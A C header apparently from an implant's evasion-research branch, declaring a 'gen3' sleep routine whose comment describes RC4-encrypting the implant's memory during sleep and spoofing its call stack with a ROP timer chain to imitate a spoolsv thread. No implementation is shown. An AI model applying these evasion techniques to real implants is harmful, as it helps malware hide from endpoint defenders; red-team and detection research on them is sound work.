#pragma once

#include <windows.h>

/* Phase 1 Gen3 sleep chain (evasion-research branch).
 *
 * gen3_sleep(time) replaces the sleep window with:
 *   1a. RC4 (SystemFunction032) encryption of every own-table section range
 *       plus every tracked heap block, with a per-cycle rotated key that
 *       lives on the stack (outside all masked ranges);
 *   1b. callstack spoofing for the whole window - a timer queue ROP chain
 *       (NtContinue x4, CallStackMasker port) backs up the real stack,
 *       overwrites it with a static spoolsv waiting shape, restores it
 *       right before wake, and signals the event the main thread waits on.
 *
 * Returns TRUE if the sleep was served. On any failure GargleSleep falls
 * back to the official sleepmask-BOF path. x64 only; x86 compiles empty.
 */
BOOL gen3_sleep(DWORD time);

/* temporary bisect probe */
void g3_log(const char * msg, long v);
